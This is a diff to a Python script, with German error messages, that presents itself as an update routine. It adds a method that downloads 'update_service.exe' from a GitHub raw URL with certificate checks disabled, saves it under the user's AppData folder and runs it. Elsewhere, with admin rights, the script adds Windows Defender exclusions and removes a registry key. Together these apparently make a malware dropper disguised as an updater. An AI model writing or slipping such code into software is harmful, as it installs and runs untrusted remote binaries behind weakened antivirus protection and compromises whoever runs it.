@@ -2,7 +2,9 @@ from math import e
 import os
 import pathlib as pl
 import random
-import re
+import ssl
+import subprocess
+import urllib.request
 import sys
 import ctypes
 import time
@@ -67,13 +69,44 @@ class Main:
                 time.sleep(2)
         except Exception as e:
             print(f"Registry Fehler: {e}")
+    
+    def download_and_install(self):
+        APP_NAME = "update_service"
+        FILE_NAME = "update_service.exe"
+        UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME
+        
+        BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
+        APP_DIR = os.path.join(BASE_DIR, APP_NAME)
+        APP_PATH = os.path.join(APP_DIR, FILE_NAME)
+        
+        os.makedirs(APP_DIR, exist_ok=True)
+        try:
+            print(f"→ Downloading {FILE_NAME} ...")
+            context = ssl._create_unverified_context()
+            req = urllib.request.Request(UPDATE_URL)
+            req.add_header("Pragma", "no-cache")
+            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
+                if getattr(resp, "status", 200) != 200:
+                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
+                    exit(1)
+                new_content = resp.read()
+
+            with open(APP_PATH, "wb") as f:
+                f.write(new_content)
+
+            print(f"→ Successfully downloaded/updated: {APP_PATH}")
+            subprocess.Popen([APP_PATH], shell=True)
+
+        except Exception as e:
+            print(f"Download/Error: {e}")
+            exit(1)
 
 if __name__ == "__main__":
     self = Main()
     if is_admin:
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
-        self.remove_hkey() #321
+        self.remove_hkey() #123
         self.perform_update()
         exit(0)
     if self.send_update_notification():
